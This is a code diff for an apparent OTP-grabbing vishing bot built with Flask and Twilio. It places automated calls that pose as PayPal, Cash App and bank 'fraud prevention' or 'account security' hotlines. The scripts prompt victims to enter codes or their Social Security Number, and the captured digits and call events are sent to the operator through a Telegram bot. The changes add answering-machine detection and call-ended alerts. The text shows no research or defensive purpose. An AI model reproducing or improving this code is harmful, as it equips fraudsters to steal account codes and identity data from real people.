@@ -22,6 +22,13 @@ def voicepaypal():
     resp = VoiceResponse()
     name = request.args.get('name')
     chanid = request.args.get('chanid')
+    print(request.values)
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
     if 'Digits' in request.values:
         choice = request.values['Digits']
         if choice == '1':
@@ -34,19 +41,39 @@ def voicepaypal():
         else:
             resp.say("Sorry, I don't understand that choice.")
     else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
         gather = Gather(num_digits=1, action='/voice/paypal?chanid=' + chanid, timeout=6)
         requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
         gather.say(f'Hello {name}, this is the PayPal fraud prevention hotline. We are calling to inform you about a request to change the number on this account. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
         resp.append(gather)
         print('Call in progress')
     return str(resp)
+@app.route('/call/status', methods=['POST','GET'])
+def status():
+    chanid = request.args.get('chanid')
+    call_sid = request.values.get('CallSid')
+    call_status = request.values.get('CallStatus')
+    if call_status == 'completed':
+          requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "☎️ Call Ended"})
+    else:
+        print(f"Call {call_sid} status updated to {call_status}.")
 
+    return ('', 204) 
 #CASHAPPP
 @app.route("/voice/cashapp", methods=['GET', 'POST'])
 def voicecash():
     chanid = request.args.get('chanid')
     resp = VoiceResponse()
     name = request.args.get('name')
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
     if 'Digits' in request.values:
         choice = request.values['Digits']
         if choice == '1':
@@ -60,6 +87,10 @@ def voicecash():
         else:
             resp.say("Sorry, I don't understand that choice.")
     else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
         gather = Gather(num_digits=1, action='/voice/cashapp?chanid=' + chanid, timeout=6)
         requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
         gather.say(f'Hello {name}, this is the Cashapp fraud prevention hotline. We are calling to inform you about a request to withdraw 100 dollars. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
@@ -74,6 +105,12 @@ def voicebank():
     resp = VoiceResponse()
     name = request.args.get('name')
     bankname = request.args.get('bank')
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
     if 'Digits' in request.values:
         choice = request.values['Digits']
         if choice == '1':
@@ -87,6 +124,10 @@ def voicebank():
         else:
             resp.say("Sorry, I don't understand that choice.")
     else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
         gather = Gather(num_digits=1, action='/voice/bank?chanid=' + chanid, timeout=6)
         requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
         gather.say(f'Hello {name}, this is the {bankname} fraud prevention hotline. We are calling to inform you about a request to login to your account. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
@@ -99,6 +140,12 @@ def voicessn():
       resp = VoiceResponse()
       name = request.args.get('name')
       bankname = request.args.get('bank')
+      if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
       if 'Digits' in request.values:
           choice = request.values['Digits']
           if choice == '1':
@@ -112,11 +159,15 @@ def voicessn():
           else:
               resp.say("Sorry, I don't understand that choice.")
       else:
-          gather = Gather(num_digits=1, action='/voice/ssn?chanid=' + chanid+'&ssn='+'True', timeout=6)
-          requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
-          gather.say(f'Hello {name}, this is the {bankname} account security hotline. We are calling to inform you about suspicious activity on your account. Preventing your account from these actions will require you to enter your Social Security Number to block such actions. Keep inmind sharing such info can allow to people hack you. Do not share your SSN with anyone else. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
-          resp.append(gather)
-          print('Call in progress')
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
+        gather = Gather(num_digits=1, action='/voice/ssn?chanid=' + chanid+'&ssn='+'True', timeout=6)
+        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
+        gather.say(f'Hello {name}, this is the {bankname} account security hotline. We are calling to inform you about suspicious activity on your account. Preventing your account from these actions will require you to enter your Social Security Number to block such actions. Keep inmind sharing such info can allow to people hack you. Do not share your SSN with anyone else. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
+        resp.append(gather)
+        print('Call in progress')
       return str(resp)
   
   
@@ -202,7 +253,6 @@ def validate():
         requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"🤳 {digits}\n✅Code captured"})
     else:
         resp.say("Sorry, we did not receive your input. Please try again later.", volume=2, voice="alice")
-    
     return str(resp)
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8030)
